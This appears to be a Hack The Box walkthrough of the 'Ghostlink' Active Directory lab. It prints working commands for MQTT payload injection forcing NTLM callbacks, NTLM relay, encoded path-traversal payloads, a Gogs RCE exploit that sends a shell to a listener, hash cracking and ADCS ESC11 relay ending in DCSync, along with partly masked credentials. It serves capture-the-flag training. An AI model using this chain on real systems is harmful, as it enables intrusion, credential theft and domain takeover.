HTB Ghostlink - Walkthrough

Category: Hard  |  Domain: ghostlink.htb    Prepared by: OgreBogre

★ Rated Hard. Felt like the box personally had something against me. Would not recommend to anyone who values their sanity - or their weekend. 10/10 would suffer again.

Ghostlink was a hard Windows Active Directory machine where the attack surface turned out to be considerably wider than it looked from the outside. The visible entry point was a DC, but behind it sat a secure share application, a self-hosted Gogs instance, and an MQTT-wired health-monitoring system. That combination sounded chaotic at first glance, yet the actual chain flowed surprisingly logically: MQTT abuse, NTLM relay, LFI, KeePass, Gogs RCE, lateral movement to a Linux user, and finally ADCS ESC11 to compromise the domain. The box also came with a few genuinely irritating distractions, specifically intermittent 500 errors from Gogs and the occasional VPN route flap, both of which turned out to be environmental noise rather than real signals. Recognising that distinction early saved a lot of unnecessary debugging time.

1. Reconnaissance

INFORMATION

The initial port scan looked like a standard Windows domain controller setup - ports 53, 88, 135, 389, 445, 636, 3268, 5985. The one outlier that immediately broke the pattern was TCP 1883. MQTT in a corporate AD environment was unusual, and in an HTB context it almost always meant there was something worth listening to. The safe move was to stop and enumerate the broker before touching anything else. 

nmap -sT -sV -sC -O -p 53,80,88,135,139,389,445,636,1883,3268,3269,5985 10.129.88.179
mosquitto_sub -h 10.129.88.179 -t '#' -v

The broker quickly revealed two internal hosts publishing on the GhostProtocolZero/systems/node/ topic hierarchy. Buried in the telemetry payloads were two hostnames with internal IPv4 addresses: gpz-op26-secure.ghostlink.htb at 172.16.20.10 and gpz-op26-toolkits.ghostlink.htb at 172.16.20.20. These were added to /etc/hosts immediately, since both resolved exclusively internally and would be needed for every subsequent step.

At this point the DC was clearly acting as a gateway and credential authority rather than the primary target itself. The real attack surface was the two internal Linux hosts.

2. MQTT Healthcheck Abuse

SUCCESS

The secureshare node published periodic health-check payloads that included a telemetry.url field. That field was writable. Publishing a crafted payload with the URL replaced by the attacker-controlled address caused the backend to initiate an outbound HTTP request to that address on its own - no complex exploit required, just abusing the built-in monitoring logic against itself. 

mosquitto_pub -h 10.129.88.179 \
  -t 'GhostProtocolZero/systems/node/secureshare/healthcheck' -r \
  -m '{"node":"node-6","telemetry":{"healthy":true,"url":"http://10.10.14.73/healthcheck","lastCheckSecAgo":16,"responseCode":"200","ip":"172.16.20.10"}}'

The callback arrived almost immediately, authenticated as GHOSTLINK\svc_canary. The important thing here was not to jump straight to cracking the hash. The more interesting question was what that account could authenticate against, and the answer turned out to be the secure share application itself. The relay was a better move than offline cracking.

3. NTLM Relay and SecureShare LFI

SUCCESS

The secure share application sat behind Windows authentication. Setting up ntlmrelayx against it and triggering the MQTT healthcheck again gave authenticated access without ever needing the plaintext credential. The application exposed a download endpoint that double-decoded the supplied path before passing it to a file open call. That double-decode is a classic path traversal pattern and it worked exactly as expected. 

impacket-ntlmrelayx -t http://gpz-op26-secure.ghostlink.htb/ --http-port 80
# Directory traversal - basic sanity check
/api/download/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cWindows%255cwin.ini

# Loopback UNC - reading the host's own C$ share via the backend process
/api/download/%255c%255c127.0.0.1%255cC$%255cUsers%255csvc_canary%255cNTUSER.DAT

The loopback UNC path was the more interesting of the two. Rather than simply escaping the uploads directory, this caused the backend to open its own administrative share and stream the file back. From that point the only remaining question was which files were actually worth retrieving.

4. NTUSER.DAT and the Registry Breadcrumb

SUCCESS

Several files looked promising from the LFI endpoint, but the real pivot came from the registry hive of svc_canary. Parsing the hive for recently accessed paths produced a specific file reference that had not appeared anywhere else during earlier enumeration. 

strings -el NTUSER.DAT | grep -iE 'zip|kdbx|documents|operations|management'

C:\Users\svc_canary\Documents\Operations\Management\db.zip

The db.zip archive was retrieved through the same LFI endpoint. It contained a KeePass database (db.kdbx) paired with a key file (.key.keyx). The key file itself was enough to open the database without needing to crack a master password - the zip package was essentially self-contained.

5. KeePass and the Gogs Credential

SUCCESS

Opening the KeePass database with the bundled key file produced several stored entries. Most of them were service-level accounts or stale credentials with no live target. The exception was vroth, whose credential was still valid and pointed directly at the Gogs instance running on gpz-op26-toolkits.ghostlink.htb:3000. At this point the box's internal structure started making sense: the MQTT-to-relay chain was specifically designed to get into the KeePass store, and the KeePass store was specifically designed to get into Gogs. 

vroth / mOo03*****YMBwvFP

6. Gogs RCE - CVE-2025-8110

SUCCESS

The Gogs instance was running version 0.13.3, which is vulnerable to an authenticated symlink-based RCE. The exploit works by abusing the repository contents API to overwrite the real .git/config file with a version that poisons the core.sshCommand option. The next time any git operation ran against that repository configuration, the injected command executed. 

python3 /home/parallels/htb/Ghostlink/exploits/CVE-2025-8110.py \
  -u http://gpz-op26-toolkits.ghostlink.htb:3000 \
  -lh 10.10.14.73 -lp 4453 \
  -U vroth -P mOo03*****YMBwvFP \
  -t 10.129.88.179 --ssh-port 22 --workdir /tmp

The script threw HTTP 500 errors at the PutContents step on multiple runs. This was the box's best trap: the 500 looked like a hard failure, but the callback had actually already landed on the listener in the background. Anyone who gave up and retried without checking the listener first wasted several minutes here. Once the shell arrived as git, the 500 errors became irrelevant.

Initial shell access as git was enough to reach the Gogs data directory, but not yet the user flag. The git account had read access to the Gogs SQLite database, which was the next logical step.

7. Gogs Database Dump and nvirelli

SUCCESS

With a shell as git, the Gogs SQLite database was readable. Extracting the user table produced hashed passwords for all registered accounts. The hash format was PBKDF2-HMAC-SHA256 with a stored salt, which Hashcat handles cleanly under mode 10900. The rockyou wordlist was enough to crack the relevant entry. 

sqlite3 gogs.db "SELECT name,salt,passwd FROM user"
hashcat -m 10900 hash.txt trimmed.txt

nvirelli / u47YUc*********heaSzI

The important detail about nvirelli was that this account existed both as a local Linux user on the toolkits host and as a domain user in the Ghostlink AD. That dual existence was the bridge between the internal Linux foothold and the later ADCS exploitation path.

8. User Flag

SUCCESS

Switching to nvirelli from the git shell required a slightly non-standard approach. Passing the password interactively through su worked inconsistently - the shell occasionally misinterpreted the password as a command when delivered separately. The reliable form was to pass both the command and the password in the same input line using su -c. Not elegant, but repeatable. 

su -c 'id; cat /home/nvirelli/user.txt' nvirelli
u47YUc*********heaSzI
uid=1001(nvirelli) gid=1001(nvirelli) groups=1001(nvirelli)
f47e23ab21dc8760ff988a6242d5****

9. Privilege Escalation - ADCS ESC11

SUCCESS

With a domain user credential in hand, the natural next step was checking the certificate authority. The CA sat on gpz-op26-secure.ghostlink.htb at its internal address, which was not directly reachable from the attacking machine, so a pivot through the established foothold was required first. Once the proxy was in place, the certificate authority was reachable via RPC.

ESC11 abuses the ICPR relay mode in ntlmrelayx: an incoming NTLM authentication is relayed directly to the certificate authority's RPC interface and a certificate is issued for the relayed identity. By coercing the DC to authenticate back to the listener, a certificate for DC01$ was obtained. That certificate was then used to recover the machine account hash, which enabled a full DCSync. 

proxychains -q ntlmrelayx.py \
  -t rpc://172.16.20.10 \
  -rpc-mode ICPR \
  -icpr-ca-name 'ghostlink-GPZ-OP26-SECURE-CA' \
  --template DomainController -smb2support -ip 10.10.14.73
certipy auth -pfx relay/DC01.pfx -dc-ip <DC-IP> -domain ghostlink.htb -username 'DC01$'

secretsdump.py -hashes :707cccd9bfc31d8507be6682448f670c \
  -just-dc-user Administrator 'ghostlink.htb/DC01$@<DC-IP>'
Administrator / 8190e067f478002d************b016696
root.txt: c5baa439bf55f54a286dbb133045****

The Administrator NTLM hash was valid for pass-the-hash against the DC. Full domain compromise confirmed.

10. Attack Chain Summary

INFORMATION
  • MQTT broker topic enumeration - discovered internal hosts and healthcheck payload structure
  • MQTT telemetry.url injection - forced NTLM callback from svc_canary
  • NTLM relay to SecureShare HTTP - authenticated session without cracking the hash
  • Double-decoded path traversal + loopback UNC - retrieved NTUSER.DAT
  • Registry hive parsing - recovered path to db.zip (KeePass + key file)
  • KeePass database - vroth credential for Gogs
  • CVE-2025-8110 (Gogs 0.13.3) - RCE as git
  • Gogs SQLite dump + Hashcat - nvirelli (Linux + domain user)
  • ESC11 RPC relay - DC01$ certificate - machine hash - DCSync - Administrator

11. Dead Ends and False Starts

DEAD END

Several paths looked promising and wasted time before being ruled out. The VPN tunnel at one point appeared live while actually providing no usable IPv4 route to the internal segment - a full reconnect was needed before any pivot traffic moved correctly. The Gogs 500 error at the PutContents step was a false negative: the exploit had already succeeded, but the HTTP response indicated failure. Anyone who retried the exploit repeatedly without first checking the listener burned time re-running a step that had already worked.

Password-based SSH directly to the toolkits host as vroth did not succeed - the credential was Gogs-only. LDAP-based enumeration of the CA from outside the network similarly produced no results until the pivot was properly established. Windows-path assumptions carried over from one machine reset also broke the initial LFI path selection, since user home directories on a fresh instance did not necessarily match paths recorded in old session notes.

None of these were large blockers individually, but arriving at them in sequence during the same session is the kind of thing that makes a three-hour box feel like six if you do not cut the thread quickly when something stops producing results.
